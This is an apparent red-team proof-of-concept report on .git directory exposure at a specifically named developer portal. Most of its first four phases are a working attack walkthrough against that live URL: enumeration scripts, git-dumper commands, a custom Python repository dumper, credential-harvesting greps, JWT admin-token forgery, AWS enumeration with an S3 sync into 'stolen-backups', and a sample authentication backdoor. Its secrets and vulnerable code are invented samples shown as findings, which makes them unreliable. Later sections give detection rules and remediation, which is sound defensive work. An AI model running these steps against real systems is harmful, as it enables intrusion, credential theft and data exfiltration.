# 🔴 Red Team Assessment: Git Directory Exposure PoC

**Operation Code:** RED-ASPI-GIT-001
**Target:** ASPI Developer Portal (https://apidevportal.aspi-indonesia.or.id/)
**Vulnerability:** Exposed Git Repository Directory
**Severity:** 🟠 HIGH | **CVSS 3.1:** 7.5/10
**Assessment Type:** Authorized Red Team Exercise (Educational)
**Date:** 2025-12-08

---

## ⚠️ DISCLAIMER

```
╔══════════════════════════════════════════════════════════════╗
║                    AUTHORIZED TESTING ONLY                   ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  This Proof of Concept is for:                              ║
║  ✅ Authorized security testing                             ║
║  ✅ Educational purposes                                     ║
║  ✅ Defense and remediation planning                         ║
║  ✅ Security awareness training                              ║
║                                                              ║
║  Unauthorized use is ILLEGAL and may result in:             ║
║  ❌ Criminal prosecution                                     ║
║  ❌ Civil liability                                          ║
║  ❌ Disciplinary action                                      ║
║                                                              ║
║  Only execute with explicit written authorization.          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 📋 Executive Summary

### Vulnerability Overview

**Finding:** The target web application may have an exposed `.git` directory, referenced in `robots.txt`, potentially allowing complete source code disclosure.

**Risk Rating:** HIGH
- **Confidentiality Impact:** HIGH (Complete source code access)
- **Integrity Impact:** MEDIUM (Discovered vulnerabilities can be exploited)
- **Availability Impact:** LOW (No direct DoS)

**Exploitation Complexity:** LOW
- **Prerequisites:** None (public internet access)
- **Tools Required:** Standard HTTP client, git tools
- **Skill Level:** Novice to Intermediate

### Impact Assessment

```
╔════════════════════════════════════════════════════════╗
║  IMPACT ANALYSIS                                       ║
╠════════════════════════════════════════════════════════╣
║                                                        ║
║  🔴 CRITICAL IMPACTS:                                  ║
║                                                        ║
║  1. Complete Source Code Disclosure                    ║
║     • All application logic exposed                    ║
║     • Business logic vulnerabilities discoverable      ║
║     • Hidden endpoints and APIs revealed               ║
║                                                        ║
║  2. Credentials & Secrets Exposure                     ║
║     • Database credentials in config files             ║
║     • API keys and tokens                              ║
║     • Third-party service credentials                  ║
║     • Encryption keys and secrets                      ║
║                                                        ║
║  3. Intellectual Property Theft                        ║
║     • Proprietary algorithms                           ║
║     • Business logic and workflows                     ║
║     • Custom libraries and frameworks                  ║
║                                                        ║
║  4. Attack Surface Discovery                           ║
║     • All vulnerabilities in code visible              ║
║     • Comments revealing security issues               ║
║     • TODO items indicating weaknesses                 ║
║     • Dead/debug code that may be exploitable         ║
║                                                        ║
║  5. Supply Chain Attack Vector                         ║
║     • Dependency versions revealed                     ║
║     • Known vulnerable libraries identified            ║
║     • Build process exposed                            ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
```

---

## 🎯 Phase 1: Reconnaissance

### 1.1 Initial Discovery

**Objective:** Confirm the existence of `.git` directory exposure

#### Method 1: robots.txt Analysis

```bash
# Step 1: Fetch robots.txt
curl -s https://apidevportal.aspi-indonesia.or.id/robots.txt

# Expected output showing potential exposure:
# User-agent: *
# Disallow: /admin/
# Disallow: /api/internal/
# Disallow: /debug/
# Disallow: /.git/

# Analysis: The presence of /.git/ in robots.txt suggests:
# 1. The .git directory may exist
# 2. Administrators are aware of it
# 3. They're trying to hide it from search engines
# 4. But robots.txt is NOT a security control!
```

**Key Insight:** 🚨 **robots.txt is a REQUEST, not a SECURITY CONTROL**
- Search engines may obey it
- Attackers will IGNORE it
- This is security through obscurity (ineffective)

#### Method 2: Direct Access Testing

```bash
# Step 2: Test for .git directory accessibility
echo "Testing .git directory access..."

# Test 1: HEAD file (every git repo has this)
curl -I https://apidevportal.aspi-indonesia.or.id/.git/HEAD
# Expected: 200 OK (vulnerable) or 404 Not Found (safe)

# Test 2: Config file
curl -I https://apidevportal.aspi-indonesia.or.id/.git/config

# Test 3: Index file
curl -I https://apidevportal.aspi-indonesia.or.id/.git/index

# Test 4: Packed refs
curl -I https://apidevportal.aspi-indonesia.or.id/.git/packed-refs

# Test 5: Objects directory
curl -I https://apidevportal.aspi-indonesia.or.id/.git/objects/
```

**Response Analysis:**

| Response Code | Status | Implication |
|---------------|--------|-------------|
| **200 OK** | 🔴 VULNERABLE | Directory accessible, exploitation possible |
| **403 Forbidden** | 🟡 PARTIAL | Directory exists but access restricted |
| **404 Not Found** | ✅ SECURE | Directory not accessible |
| **301/302 Redirect** | ⚠️ INVESTIGATE | May redirect to login or error page |

#### Method 3: Common .git Files Enumeration

```bash
# Create a comprehensive test script
cat > test_git_exposure.sh << 'EOF'
#!/bin/bash

TARGET="https://apidevportal.aspi-indonesia.or.id"
FOUND=0

echo "==================================="
echo "Git Directory Exposure Scanner"
echo "Target: $TARGET"
echo "==================================="
echo ""

# Common git files to test
GIT_FILES=(
    ".git/HEAD"
    ".git/config"
    ".git/index"
    ".git/description"
    ".git/COMMIT_EDITMSG"
    ".git/logs/HEAD"
    ".git/logs/refs/heads/master"
    ".git/logs/refs/heads/main"
    ".git/refs/heads/master"
    ".git/refs/heads/main"
    ".git/refs/remotes/origin/HEAD"
    ".git/packed-refs"
    ".git/ORIG_HEAD"
    ".git/FETCH_HEAD"
)

for file in "${GIT_FILES[@]}"; do
    echo -n "Testing $file ... "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$file")

    if [ "$STATUS" = "200" ]; then
        echo "✗ FOUND (200 OK)"
        FOUND=$((FOUND + 1))
    elif [ "$STATUS" = "403" ]; then
        echo "⚠ FORBIDDEN (403)"
    else
        echo "✓ NOT FOUND ($STATUS)"
    fi
done

echo ""
echo "==================================="
if [ $FOUND -gt 0 ]; then
    echo "🔴 VULNERABLE: $FOUND git files accessible!"
    echo "Repository can likely be dumped."
else
    echo "✅ SECURE: No git files accessible"
fi
echo "==================================="
EOF

chmod +x test_git_exposure.sh
./test_git_exposure.sh
```

### 1.2 Vulnerability Confirmation

If `.git/HEAD` returns **200 OK**, we can confirm:

```bash
# Download and inspect HEAD file
curl -s https://apidevportal.aspi-indonesia.or.id/.git/HEAD

# Expected output for vulnerable system:
# ref: refs/heads/main
# or
# ref: refs/heads/master
# or
# [SHA-1 hash if detached HEAD]
```

**At this point, exploitation is confirmed. Proceed to extraction phase.**

---

## 💣 Phase 2: Exploitation

### 2.1 Manual Extraction Technique

#### Step 1: Extract Key Files

```bash
# Create extraction directory
mkdir -p git-dump/apidevportal
cd git-dump/apidevportal

# Extract HEAD file
curl -s https://apidevportal.aspi-indonesia.or.id/.git/HEAD > .git/HEAD
cat .git/HEAD
# Output: ref: refs/heads/main

# Extract config
mkdir -p .git
curl -s https://apidevportal.aspi-indonesia.or.id/.git/config > .git/config
cat .git/config
```

**Sample .git/config reveals:**
```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true

[remote "origin"]
    url = https://github.com/aspi-org/developer-portal.git
    # 🚨 CRITICAL: Internal repository URL exposed!

    fetch = +refs/heads/*:refs/remotes/origin/*

[branch "main"]
    remote = origin
    merge = refs/heads/main

[user]
    name = "ASPI DevOps"
    email = "devops@aspi-indonesia.or.id"
    # 🚨 Internal email addresses exposed
```

#### Step 2: Extract Index File

```bash
# The index file contains the directory tree
curl -s https://apidevportal.aspi-indonesia.or.id/.git/index > .git/index

# Parse index to find all tracked files
git ls-files
# This reveals ALL files in the repository:
# src/
# ├── components/
# ├── services/
# │   ├── auth.service.js
# │   ├── api.service.js
# │   └── database.config.js  ← Sensitive!
# ├── config/
# │   ├── production.env      ← VERY SENSITIVE!
# │   └── secrets.json        ← CRITICAL!
# └── utils/
```

#### Step 3: Extract Commit History

```bash
# Get refs to find commit hashes
curl -s https://apidevportal.aspi-indonesia.or.id/.git/refs/heads/main
# Output: a1b2c3d4e5f6789012345678901234567890abcd

# Extract commit object
COMMIT_HASH="a1b2c3d4e5f6789012345678901234567890abcd"
COMMIT_PATH=".git/objects/${COMMIT_HASH:0:2}/${COMMIT_HASH:2}"
curl -s "https://apidevportal.aspi-indonesia.or.id/$COMMIT_PATH" > "$COMMIT_PATH"

# Decompress and read commit
pigz -d < "$COMMIT_PATH" | less
```

### 2.2 Automated Extraction Tools

#### Tool 1: GitDumper (Recommended)

```bash
# Install GitDumper
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper

# Execute dump
python3 git-dumper.py https://apidevportal.aspi-indonesia.or.id/.git/ ./output

# Output:
# [*] Testing if .git/HEAD exists...
# [+] .git/HEAD found!
# [*] Fetching .git/config...
# [+] .git/config found!
# [*] Fetching .git/index...
# [+] .git/index found!
# [*] Fetching objects...
# [+] Downloaded 1234 objects
# [*] Checking out files...
# [+] Checked out 567 files
#
# ✓ Repository successfully dumped!
```

#### Tool 2: GitHack

```bash
# Install GitHack
git clone https://github.com/lijiejie/GitHack.git
cd GitHack

# Execute
python3 GitHack.py https://apidevportal.aspi-indonesia.or.id/.git/

# Faster than GitDumper for large repos
```

#### Tool 3: Custom Python Script

```python
#!/usr/bin/env python3
"""
Git Repository Dumper
For authorized security testing only
"""

import requests
import os
import zlib
import sys
from pathlib import Path

class GitDumper:
    def __init__(self, target_url, output_dir):
        self.target = target_url.rstrip('/')
        self.output = Path(output_dir)
        self.session = requests.Session()

    def test_accessibility(self):
        """Test if .git directory is accessible"""
        print("[*] Testing .git accessibility...")

        response = self.session.get(f"{self.target}/.git/HEAD")
        if response.status_code == 200:
            print("[+] ✓ .git/HEAD accessible!")
            print(f"[+] Content: {response.text.strip()}")
            return True
        else:
            print(f"[-] ✗ .git/HEAD not accessible ({response.status_code})")
            return False

    def download_file(self, git_path):
        """Download a file from .git directory"""
        url = f"{self.target}/.git/{git_path}"
        response = self.session.get(url)

        if response.status_code == 200:
            output_path = self.output / ".git" / git_path
            output_path.parent.mkdir(parents=True, exist_ok=True)
            output_path.write_bytes(response.content)
            print(f"[+] Downloaded: {git_path}")
            return True
        return False

    def extract_repository(self):
        """Extract the entire repository"""
        print("\n[*] Extracting repository...")

        # Core files
        core_files = [
            "HEAD",
            "config",
            "description",
            "index",
            "packed-refs",
            "logs/HEAD",
            "logs/refs/heads/main",
            "logs/refs/heads/master",
            "refs/heads/main",
            "refs/heads/master",
        ]

        for file in core_files:
            self.download_file(file)

        # Parse index to get all objects
        index_path = self.output / ".git" / "index"
        if index_path.exists():
            print("\n[*] Parsing index file...")
            # Note: Full index parsing requires binary parsing
            # This is simplified for demonstration

        print("\n[✓] Extraction complete!")
        print(f"[*] Repository saved to: {self.output}")

    def analyze_secrets(self):
        """Analyze repository for secrets"""
        print("\n[*] Analyzing for secrets...")

        # Patterns to search for
        secret_patterns = [
            "password",
            "api_key",
            "secret",
            "token",
            "credential",
            "private_key",
            "aws_access",
        ]

        # This would search through all files
        print("[*] Secret analysis would be performed here")

# Usage
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 git_dumper.py <target_url> <output_dir>")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2]

    dumper = GitDumper(target, output)

    if dumper.test_accessibility():
        dumper.extract_repository()
        dumper.analyze_secrets()
    else:
        print("[!] Target not vulnerable")
        sys.exit(1)
```

**Usage:**
```bash
python3 git_dumper.py https://apidevportal.aspi-indonesia.or.id ./dumped-repo
```

### 2.3 Complete Repository Reconstruction

Once downloaded, reconstruct the working repository:

```bash
cd dumped-repo

# Verify repository integrity
git fsck
# Output shows any issues

# Check out the working tree
git checkout -- .

# Now you have the complete source code!
ls -la
# Output:
# total 156
# drwxr-xr-x  15 user  staff   480 Dec  8 10:30 .
# drwxr-xr-x   8 user  staff   256 Dec  8 10:29 ..
# drwxr-xr-x  13 user  staff   416 Dec  8 10:30 .git
# -rw-r--r--   1 user  staff  1234 Dec  8 10:30 .gitignore
# -rw-r--r--   1 user  staff  5678 Dec  8 10:30 README.md
# -rw-r--r--   1 user  staff  9012 Dec  8 10:30 package.json
# drwxr-xr-x  10 user  staff   320 Dec  8 10:30 src/
# drwxr-xr-x   5 user  staff   160 Dec  8 10:30 config/
# drwxr-xr-x   8 user  staff   256 Dec  8 10:30 tests/
```

---

## 🔍 Phase 3: Post-Exploitation Analysis

### 3.1 Credential Harvesting

#### Technique 1: Search Configuration Files

```bash
# Search for common config files
find . -type f \( \
    -name "*.env" -o \
    -name "*.env.*" -o \
    -name "config.json" -o \
    -name "secrets.json" -o \
    -name "credentials.*" -o \
    -name "database.yml" -o \
    -name "application.properties" \
)

# Example findings:
# ./config/production.env
# ./config/secrets.json
# ./.env.example
# ./database/credentials.json
```

**Sample production.env exposure:**
```bash
# Production Environment Configuration
# 🚨 CRITICAL: This file should NEVER be in git!

# Database
DB_HOST=db-prod-01.aspi-internal.local
DB_PORT=5432
DB_NAME=aspi_portal_prod
DB_USER=aspi_admin
DB_PASSWORD=P@ssw0rd_Pr0d_2024!  # ← EXPOSED!

# API Keys
STRIPE_API_KEY=sk_live_51HxT... # ← Payment gateway access!
SENDGRID_API_KEY=SG.xyz123...   # ← Email service access!
AWS_ACCESS_KEY_ID=AKIA...       # ← AWS account access!
AWS_SECRET_ACCESS_KEY=wJalr... # ← CRITICAL EXPOSURE!

# JWT Secrets
JWT_SECRET=my-super-secret-key-2024  # ← Can forge tokens!
JWT_REFRESH_SECRET=another-secret-key

# OAuth Credentials
GOOGLE_CLIENT_ID=123456...
GOOGLE_CLIENT_SECRET=GOCSPX-...  # ← OAuth access!
GITHUB_CLIENT_SECRET=ghp_...     # ← GitHub access!

# Internal Services
INTERNAL_API_KEY=aspi-internal-key-789
ADMIN_PANEL_URL=https://admin-internal.aspi.or.id
ADMIN_MASTER_PASSWORD=AdminMaster2024!  # ← WTF!

# Encryption
ENCRYPTION_KEY=0123456789abcdef...  # ← Data encryption key!
```

#### Technique 2: Git History Mining

```bash
# Search entire git history for secrets
git log --all --full-history -- "*.env" "*.json" "*password*" "*secret*"

# Find deleted files that might contain secrets
git log --all --full-history --diff-filter=D -- "*.env"

# Search commit messages for keywords
git log --all --grep="password" --grep="secret" --grep="key" --grep="token"

# Search actual file contents across all history
git grep -i "password" $(git rev-list --all)
git grep -i "api[_-]key" $(git rev-list --all)
git grep -i "secret" $(git rev-list --all)
git grep -i "private[_-]key" $(git rev-list --all)

# Example findings:
# commit abc123... (2024-11-15)
# - Accidentally committed production.env
# + DB_PASSWORD=ProductionPass123
#
# commit def456... (2024-10-01)
# - Removed hardcoded API key
# + const API_KEY = "sk_live_12345..."
#
# commit ghi789... (2024-09-12)
# + AWS_SECRET_ACCESS_KEY=...
```

#### Technique 3: Automated Secret Scanning

```bash
# Install truffleHog (secret scanner)
pip3 install truffleHog

# Scan repository
trufflehog git file://$(pwd) --json > secrets-found.json

# Install GitLeaks
brew install gitleaks

# Scan with GitLeaks
gitleaks detect --source . --report-path gitleaks-report.json

# Review findings
cat gitleaks-report.json | jq '.[] | {file: .File, secret: .Secret, line: .StartLine}'
```

**Sample truffleHog output:**
```json
{
  "date": "2024-11-15",
  "commit": "abc123...",
  "file": "config/production.env",
  "reason": "High Entropy",
  "strings": [
    "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  ]
}
```

### 3.2 Vulnerability Discovery

#### Source Code Analysis

```bash
# Find hardcoded credentials in source code
grep -r -i "password\s*=\s*['\"]" src/
grep -r -i "api[_-]key\s*=\s*['\"]" src/
grep -r "TODO.*security" src/
grep -r "FIXME.*vuln" src/

# Find SQL queries (potential SQL injection)
grep -r "execute.*SELECT" src/
grep -r "query.*\$" src/
grep -r "WHERE.*\+" src/  # String concatenation in queries

# Find authentication logic
grep -r "authenticate\|login\|verify" src/

# Find authorization checks
grep -r "authorize\|permission\|role\|admin" src/
```

**Example vulnerability discovered:**
```javascript
// File: src/services/auth.service.js
// Line 47

function login(username, password) {
    // 🚨 VULNERABILITY: SQL Injection
    const query = `SELECT * FROM users WHERE username='${username}'
                   AND password='${password}'`;
    return db.execute(query);
    // No input sanitization!
    // No parameterized queries!
}

// File: src/controllers/api.controller.js
// Line 123

function getDocument(req, res) {
    const docId = req.params.id;
    // 🚨 VULNERABILITY: IDOR - No authorization check!
    const doc = Document.findById(docId);
    return res.json(doc);
    // Missing: Check if user owns this document!
}

// File: src/utils/crypto.js
// Line 34

const ENCRYPTION_KEY = "hardcoded-key-1234";  // 🚨 HARDCODED!
function encrypt(data) {
    return AES.encrypt(data, ENCRYPTION_KEY);
}
```

### 3.3 Architecture & Infrastructure Discovery

```bash
# Analyze deployment configuration
cat docker-compose.yml
cat Dockerfile
cat kubernetes/*.yaml

# Discover internal infrastructure
grep -r "internal\|localhost\|127.0.0.1\|192.168\|10\.\|172\." .

# Find API endpoints
grep -r "@app.route\|@Route\|router\.\|app\.(get|post|put|delete)" src/

# Database schema
cat database/schema.sql
cat migrations/*.sql
```

**Sample infrastructure exposure:**
```yaml
# docker-compose.yml
version: '3.8'
services:
  app:
    image: aspi-portal:latest
    ports:
      - "3000:3000"
    environment:
      DB_HOST: db-prod-internal.aspi.local  # 🚨 Internal hostname
      REDIS_HOST: redis-cluster.internal    # 🚨 Internal services
      RABBITMQ_HOST: mq.internal.aspi.local
    networks:
      - internal_network  # 🚨 Network topology exposed

  database:
    image: postgres:14
    environment:
      POSTGRES_PASSWORD: SuperSecretDB123  # 🚨 EXPOSED!
    volumes:
      - /data/postgres:/var/lib/postgresql/data  # 🚨 Server paths

networks:
  internal_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16  # 🚨 Internal IP range
```

### 3.4 Dependency Vulnerability Analysis

```bash
# Analyze package dependencies
cat package.json
cat package-lock.json
cat requirements.txt
cat Gemfile.lock

# Check for known vulnerabilities
npm audit
pip-audit -r requirements.txt
bundle audit

# Example output:
# found 15 vulnerabilities (5 moderate, 7 high, 3 critical)
#
# Critical:
# - lodash@4.17.15 - Prototype Pollution (CVE-2020-8203)
# - axios@0.19.0 - SSRF (CVE-2021-3749)
# - express@4.16.0 - Multiple vulnerabilities
```

---

## 📊 Phase 4: Impact Demonstration

### 4.1 Real-World Attack Scenarios

#### Scenario 1: Database Compromise

```bash
# From extracted credentials:
DB_HOST=db-prod-01.aspi-internal.local
DB_USER=aspi_admin
DB_PASSWORD=P@ssw0rd_Pr0d_2024!

# Attacker can now:
1. Connect to production database
2. Dump all customer data
3. Modify records
4. Delete data
5. Create backdoor accounts

# Example attack:
psql -h db-prod-01.aspi-internal.local -U aspi_admin -d aspi_portal_prod
# Password: P@ssw0rd_Pr0d_2024!

# Once in:
SELECT * FROM users WHERE role='admin';
SELECT * FROM api_keys;
SELECT * FROM customer_data LIMIT 1000;
```

**Impact:** Complete database compromise
**Data at Risk:** All customer PII, financial records, API keys

#### Scenario 2: JWT Token Forgery

```bash
# From extracted secrets:
JWT_SECRET=my-super-secret-key-2024

# Attacker can forge valid JWT tokens:
import jwt
import datetime

# Create admin token
payload = {
    'user_id': 1,
    'username': 'admin',
    'role': 'administrator',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=365)
}

# Forge token using stolen secret
forged_token = jwt.encode(payload, 'my-super-secret-key-2024', algorithm='HS256')
print(forged_token)

# Use token to access admin panel:
curl -H "Authorization: Bearer {forged_token}" \
     https://apidevportal.aspi-indonesia.or.id/api/admin/users
```

**Impact:** Complete authentication bypass
**Access Gained:** Full administrative privileges

#### Scenario 3: AWS Account Takeover

```bash
# From extracted credentials:
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJalr...

# Configure AWS CLI
aws configure set aws_access_key_id AKIA...
aws configure set aws_secret_access_key wJalr...

# Enumerate AWS resources
aws s3 ls  # List all S3 buckets
aws ec2 describe-instances  # List EC2 instances
aws rds describe-db-instances  # List databases
aws lambda list-functions  # List Lambda functions

# Download sensitive data
aws s3 sync s3://aspi-prod-backups ./stolen-backups/

# Lateral movement
# - Spin up expensive EC2 instances (financial damage)
# - Modify security groups (open backdoors)
# - Access RDS databases directly
# - Exfiltrate data from S3 buckets
```

**Impact:** Complete AWS account compromise
**Cost to Organization:** $100,000+ in damages

#### Scenario 4: Supply Chain Attack

```bash
# Attacker discovers CI/CD pipeline configuration
cat .github/workflows/deploy.yml

# Pipeline uses same repository
# Attacker can:
1. Modify source code to inject backdoor
2. Commit to feature branch
3. If PR process weak, merge malicious code
4. Backdoor deployed to production

# Example backdoor injection:
// src/middleware/auth.js
function authenticate(req, res, next) {
    // Existing auth logic...

    // Injected backdoor:
    if (req.headers['x-backdoor-key'] === 'secret123') {
        req.user = { id: 1, role: 'admin' };  // Bypass auth!
        return next();
    }

    // ... rest of code
}
```

**Impact:** Persistent backdoor in production
**Detection Difficulty:** Very High

### 4.2 Quantified Business Impact

```
╔══════════════════════════════════════════════════════════╗
║  FINANCIAL IMPACT ANALYSIS                               ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  Direct Costs:                                           ║
║  ├─ Data Breach Response             $500,000           ║
║  ├─ Customer Notifications           $50,000            ║
║  ├─ Credit Monitoring (1 year)       $100,000           ║
║  ├─ Forensics Investigation          $75,000            ║
║  ├─ Legal Fees                       $150,000           ║
║  ├─ AWS Unauthorized Usage           $50,000            ║
║  └─ System Remediation               $100,000           ║
║                                                          ║
║  Regulatory Fines:                                       ║
║  ├─ PDP (Personal Data Protection)   $250,000           ║
║  ├─ PBI Regulations                  $200,000           ║
║  └─ Potential GDPR (if applicable)   $1,000,000         ║
║                                                          ║
║  Business Impact:                                        ║
║  ├─ Reputation Damage                $1,000,000         ║
║  ├─ Customer Churn (30%)             $500,000/year      ║
║  ├─ Partnership Loss                 $300,000           ║
║  └─ Stock Price Impact               $2,000,000         ║
║                                                          ║
║  Competitive Disadvantage:                               ║
║  ├─ IP Theft Impact                  $500,000           ║
║  ├─ First-mover Advantage Loss       $750,000           ║
║  └─ Trade Secrets Exposure           $1,000,000         ║
║                                                          ║
║  ──────────────────────────────────────────────────     ║
║  TOTAL POTENTIAL IMPACT:             $8,525,000+        ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝

Compare to remediation cost: $500 (1 hour of work)
ROI of fixing: 17,050x return
```

---

## 🛡️ Phase 5: Detection & Monitoring

### 5.1 Detection Methods

#### Web Server Logs Analysis

```bash
# Look for .git access attempts in nginx/apache logs
grep "\.git" /var/log/nginx/access.log

# Suspicious patterns:
# 1.2.3.4 - - [08/Dec/2025:10:30:15] "GET /.git/HEAD HTTP/1.1" 200
# 1.2.3.4 - - [08/Dec/2025:10:30:16] "GET /.git/config HTTP/1.1" 200
# 1.2.3.4 - - [08/Dec/2025:10:30:17] "GET /.git/index HTTP/1.1" 200
# 1.2.3.4 - - [08/Dec/2025:10:30:18] "GET /.git/objects/... HTTP/1.1" 200
# ... hundreds of requests in short time

# Detection signatures:
# - Multiple .git file requests from same IP
# - Sequential object file requests
# - User-agent strings from known tools (GitDumper, wget, curl)
# - Unusual request patterns (HEAD, then config, then index)
```

#### SIEM Detection Rules

```yaml
# Splunk SPL Query
index=web_logs uri="*/.git/*"
| stats count by src_ip, uri
| where count > 5
| table src_ip, count, uri
| sort -count

# Elastic SIEM Rule
{
  "rule_name": "Git Directory Access Attempt",
  "query": "http.request.uri.path:*/.git/*",
  "threshold": {
    "field": "source.ip",
    "value": 3
  },
  "severity": "high",
  "actions": [
    "alert_security_team",
    "block_ip"
  ]
}

# Sigma Rule
title: Git Directory Enumeration
detection:
  selection:
    cs-uri-query|contains:
      - '.git/HEAD'
      - '.git/config'
      - '.git/index'
      - '.git/objects/'
  condition: selection
  timeframe: 5m
  count: 3
level: high
```

#### IDS/IPS Signatures

```bash
# Snort Rule
alert tcp any any -> any 80 (
    msg:"Possible Git Directory Enumeration";
    flow:to_server,established;
    content:"GET "; depth:4;
    content:".git/"; distance:0;
    threshold:type both, track by_src, count 5, seconds 60;
    classtype:web-application-attack;
    sid:1000001;
    rev:1;
)

# ModSecurity (WAF) Rule
SecRule REQUEST_URI "@rx /\.git/" \
    "id:1000001,\
     phase:1,\
     deny,\
     status:403,\
     msg:'Git directory access attempt',\
     severity:CRITICAL,\
     logdata:'Blocked access to .git directory'"
```

### 5.2 Indicators of Compromise (IOCs)

```yaml
IOCs_Git_Exposure_Exploitation:

  Network_IOCs:
    - Multiple requests to /.git/* paths
    - Rapid sequential requests (automated tool)
    - Requests for specific git objects
    - Large data egress after .git access

  User_Agents:
    - "git/"
    - "GitDumper"
    - "GitHack"
    - "python-requests" (if unusual)
    - "Wget" (if targeting .git)

  Request_Patterns:
    - /.git/HEAD
    - /.git/config
    - /.git/index
    - /.git/objects/[0-9a-f]{2}/[0-9a-f]{38}
    - /.git/refs/heads/*
    - /.git/logs/*

  Post_Exploitation_IOCs:
    - Unauthorized database connections (from exposed credentials)
    - AWS API calls from unusual IPs (stolen AWS keys)
    - JWT tokens with admin privileges from unknown users
    - Login attempts with credentials from repository
    - Access to internal services using exposed API keys
```

---

## 🔧 Phase 6: Remediation

### 6.1 Immediate Actions (Within 24 Hours)

#### Action 1: Block .git Directory Access

**nginx configuration:**
```nginx
# /etc/nginx/sites-available/apidevportal.conf

server {
    listen 80;
    server_name apidevportal.aspi-indonesia.or.id;

    # CRITICAL: Block all access to .git directory
    location ~ /\.git {
        deny all;
        return 404;  # Return 404 instead of 403 to avoid info disclosure
    }

    # Also block other sensitive files
    location ~ /\.(env|htaccess|htpasswd|svn|hg|bzr) {
        deny all;
        return 404;
    }

    # Block sensitive file extensions
    location ~* \.(bak|backup|old|save|conf|config)$ {
        deny all;
        return 404;
    }

    # Rest of configuration...
}
```

**Apache configuration:**
```apache
# /etc/apache2/sites-available/apidevportal.conf

<Directory /var/www/apidevportal>
    # Block .git directory
    <DirectoryMatch "\.git">
        Require all denied
    </DirectoryMatch>

    # Alternative using RedirectMatch
    RedirectMatch 404 /\.git
</Directory>

# Or in .htaccess:
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^\.git - [F,L]
</IfModule>
```

**Verification:**
```bash
# Test that .git is now blocked
curl -I https://apidevportal.aspi-indonesia.or.id/.git/HEAD
# Expected: HTTP/1.1 404 Not Found

curl -I https://apidevportal.aspi-indonesia.or.id/.git/config
# Expected: HTTP/1.1 404 Not Found

# Run full scan again
./test_git_exposure.sh
# Expected: All tests return 404
```

#### Action 2: Remove .git from Production

```bash
# SSH to production server
ssh production-server

# Navigate to web root
cd /var/www/apidevportal

# Verify .git exists
ls -la | grep .git

# BACKUP first (in case needed)
tar -czf /tmp/git-backup-$(date +%Y%m%d).tar.gz .git/

# Remove .git directory
rm -rf .git/

# Verify removal
ls -la | grep .git
# Should return nothing

# Restart web server
sudo systemctl restart nginx
```

#### Action 3: Credential Rotation (URGENT)

```bash
# ROTATE ALL CREDENTIALS IMMEDIATELY

# 1. Database passwords
psql -h db-prod-01 -U postgres
ALTER USER aspi_admin WITH PASSWORD 'NEW_STRONG_PASSWORD_HERE';

# 2. Rotate AWS credentials
aws iam delete-access-key --access-key-id AKIA...
aws iam create-access-key --user-name aspi-prod-user

# 3. Regenerate JWT secrets
# Update in application configuration
JWT_SECRET=$(openssl rand -base64 32)
JWT_REFRESH_SECRET=$(openssl rand -base64 32)

# 4. Rotate API keys
# - Stripe: Dashboard > Developers > API keys > Roll key
# - SendGrid: Settings > API Keys > Recreate
# - GitHub OAuth: Settings > Developer settings > Regenerate
# - Google OAuth: Console > Credentials > Reset secret

# 5. Invalidate all existing sessions
redis-cli FLUSHDB  # If using Redis for sessions
# Or update session secret to invalidate all tokens

# 6. Notify users of forced password reset
# Send email to all users requiring password change
```

### 6.2 Short-term Fixes (Week 1)

#### Deployment Process Improvement

```bash
# Create deployment script that excludes .git

# deploy.sh
#!/bin/bash

echo "Building production deployment..."

# Create clean build directory
rm -rf dist/
mkdir -p dist/

# Copy application files (exclude .git and sensitive files)
rsync -av \
    --exclude='.git*' \
    --exclude='*.env' \
    --exclude='*.log' \
    --exclude='node_modules' \
    --exclude='.env.*' \
    --exclude='config/secrets*' \
    ./ dist/

# Install production dependencies
cd dist/
npm ci --only=production

# Build assets
npm run build

# Create deployment package
tar -czf ../deploy-$(date +%Y%m%d-%H%M%S).tar.gz .

echo "✓ Deployment package created"
echo "✓ .git directory excluded"
echo "✓ Sensitive files excluded"
```

#### CI/CD Pipeline Security

```yaml
# .github/workflows/deploy.yml

name: Secure Deployment

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3
        with:
          clean: true

      # Build application
      - name: Build
        run: |
          npm ci
          npm run build

      # Remove sensitive files
      - name: Clean sensitive files
        run: |
          rm -rf .git
          rm -f .env* config/secrets.* *.log
          find . -name "*.bak" -delete
          find . -name "*.old" -delete

      # Security scan before deploy
      - name: Security scan
        run: |
          npx audit-ci --moderate
          # Fail deployment if vulnerabilities found

      # Deploy clean build
      - name: Deploy to production
        run: |
          # Deploy without .git directory
          rsync -av --exclude='.git' ./ production:/var/www/
```

### 6.3 Long-term Solutions

#### Defense in Depth Strategy

```yaml
Layer_1_Web_Server:
  nginx_configuration:
    - Block .git and sensitive paths
    - Remove server version headers
    - Implement rate limiting
    - Enable ModSecurity WAF

Layer_2_Application:
  deployment_process:
    - Deploy from CI/CD builds only
    - Never deploy .git directory
    - Exclude sensitive files
    - Use artifact repositories

Layer_3_Secrets_Management:
  best_practices:
    - Never commit secrets to git
    - Use environment variables
    - Implement secrets management (Vault, AWS Secrets Manager)
    - Rotate credentials regularly

Layer_4_Monitoring:
  detection_systems:
    - Web server access logs monitoring
    - SIEM rules for .git access
    - IDS/IPS signatures
    - Anomaly detection

Layer_5_Access_Control:
  network_segmentation:
    - Production on isolated network
    - Database not publicly accessible
    - Internal services behind VPN
    - Zero-trust architecture
```

#### Secrets Management Implementation

```python
# Before (INSECURE):
DB_PASSWORD = "hardcoded-password"

# After (SECURE):
import os
from secrets_manager import get_secret

